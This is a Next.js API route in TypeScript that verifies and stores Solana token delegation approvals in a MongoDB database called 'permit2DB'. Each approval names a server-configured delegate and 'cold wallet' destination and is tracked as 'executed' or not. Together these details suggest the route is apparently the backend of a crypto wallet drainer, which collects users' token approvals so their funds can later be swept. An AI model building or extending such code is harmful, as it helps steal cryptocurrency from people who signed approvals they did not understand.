import { NextResponse } from "next/server";
import { Db, MongoClient } from "mongodb";
import * as dotenv from 'dotenv'
import { ComputeBudgetProgram, PublicKey } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
import { Connection } from '@solana/web3.js';

dotenv.config({ override: true })

const MONGO_URI = process.env.MONGODB_URI;
const LIGHTHOUSE_V2_PROGRAM_ID = 'L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95';
const client = new MongoClient(MONGO_URI!);
let db: Db | undefined;

async function connectDB() {
  if (!db) {
    await client.connect();
    db = client.db('permit2DB');
    console.log('Connected to MongoDB');
  }
  return db;
}

interface SolanaApprovalDetail {
  tokenAccount: string;
  mint: string;
  amount: string; // Store as string to handle large numbers
  decimals: number;
  symbol?: string;
  programId: string;
}


export async function POST(req: Request) {
  try {
    const { 
      owner, 
      delegate, 
      approvals, 
      transactionSignature, 
      network,
      destinationAddress,
    } = await req.json();
    
    if (!owner || !delegate || !approvals || !Array.isArray(approvals) || !transactionSignature || !network || !destinationAddress) {
      return NextResponse.json({ message: "Missing required fields" }, { status: 400 });
    }

    const configuredDestination = process.env.SOLANA_MAINNET_DESTINATION;
    const configuredDelegate = process.env.SOLANA_MAINNET_DELEGATE;
    if (!configuredDestination || !configuredDelegate) {
      return NextResponse.json({ message: "Solana destination/delegate is not configured on the server" }, { status: 500 });
    }
    if (network !== 'mainnet-beta' || new PublicKey(destinationAddress).toBase58() !== new PublicKey(configuredDestination).toBase58()) {
      return NextResponse.json({ message: "Destination does not match the server-configured cold wallet" }, { status: 400 });
    }
    if (new PublicKey(delegate).toBase58() !== new PublicKey(configuredDelegate).toBase58()) {
      return NextResponse.json({ message: "Delegate does not match the server configuration" }, { status: 400 });
    }

    const rpcUrl = process.env.SOLANA_MAINNET_RPC;
    if (!rpcUrl) return NextResponse.json({ message: "Solana RPC is not configured on the server" }, { status: 500 });
    const submittedTransaction = await new Connection(rpcUrl, 'confirmed').getParsedTransaction(transactionSignature, { maxSupportedTransactionVersion: 0 });
    if (!submittedTransaction || submittedTransaction.meta?.err) {
      return NextResponse.json({ message: "Approval transaction was not found or failed" }, { status: 400 });
    }
    const expectedOwner = new PublicKey(owner).toBase58();
    const expectedDelegate = new PublicKey(configuredDelegate).toBase58();
    const forbiddenInstruction = submittedTransaction.transaction.message.instructions.find((instruction: any) => {
      // Wallets commonly append ComputeBudget instructions. They do not move tokens.
      const programId = typeof instruction.programId === 'string' ? instruction.programId : instruction.programId?.toBase58();
      if (programId === ComputeBudgetProgram.programId.toBase58()) return false;
      if (programId === LIGHTHOUSE_V2_PROGRAM_ID) {
        return !Array.isArray(instruction.accounts)
          || instruction.accounts.length !== 1
          || instruction.accounts[0]?.toString() !== expectedOwner;
      }
      const isTokenProgram = programId === TOKEN_PROGRAM_ID.toBase58() || programId === TOKEN_2022_PROGRAM_ID.toBase58();
      const parsed = instruction.parsed;
      return !isTokenProgram || !parsed || !['approve', 'approveChecked'].includes(parsed.type) ||
        parsed.info?.delegate !== expectedDelegate || parsed.info?.owner !== expectedOwner;
    });
    if (forbiddenInstruction) {
      return NextResponse.json({ message: "Submitted transaction contains a non-approval or mismatched instruction" }, { status: 400 });
    }
    for (const approval of approvals as SolanaApprovalDetail[]) {
      try {
        new PublicKey(approval.tokenAccount);
        new PublicKey(approval.mint);
        if (![TOKEN_PROGRAM_ID.toBase58(), TOKEN_2022_PROGRAM_ID.toBase58()].includes(approval.programId)) throw new Error('unsupported token program');
        if (BigInt(approval.amount) <= 0n || !Number.isInteger(approval.decimals) || approval.decimals < 0 || approval.decimals > 255) throw new Error('invalid token metadata');
      } catch {
        return NextResponse.json({ message: "Invalid token approval metadata" }, { status: 400 });
      }
    }

    if (approvals.length === 0) {
      return NextResponse.json({ message: "No approvals provided" }, { status: 400 });
    }

    const database = await connectDB();
    const solanaApprovalsCollection = database.collection('solana_approvals');
    if (await solanaApprovalsCollection.findOne({ transactionSignature })) {
      return NextResponse.json({ message: "Approval transaction already stored" }, { status: 409 });
    }
    
    await solanaApprovalsCollection.insertOne({
      owner,
      delegate,
      approvals, // Array of approval details
      transactionSignature,
      network, // 'mainnet-beta'
      destinationAddress: new PublicKey(configuredDestination).toBase58(),
      createdAt: new Date(),
      submitted: true, // Solana approvals are submitted immediately
      submittedAt: new Date(),
      executed: false, // Track if the approval has been used
      executedAt: null,
      verified: false, // Track if we've verified the approval on-chain
      verifiedAt: null,
      reason: null
    });

    return NextResponse.json({ message: "Solana approval stored to db successfully" }, { status: 200 });
  } catch (error) {
    console.error('Failed to store Solana approval:', error);
    return NextResponse.json(
      { message: "Failed to store Solana approval", error: (error as Error).message },
      { status: 500 }
    );
  }
}

process.on('SIGINT', async () => {
  await client.close();
  process.exit(0);
});
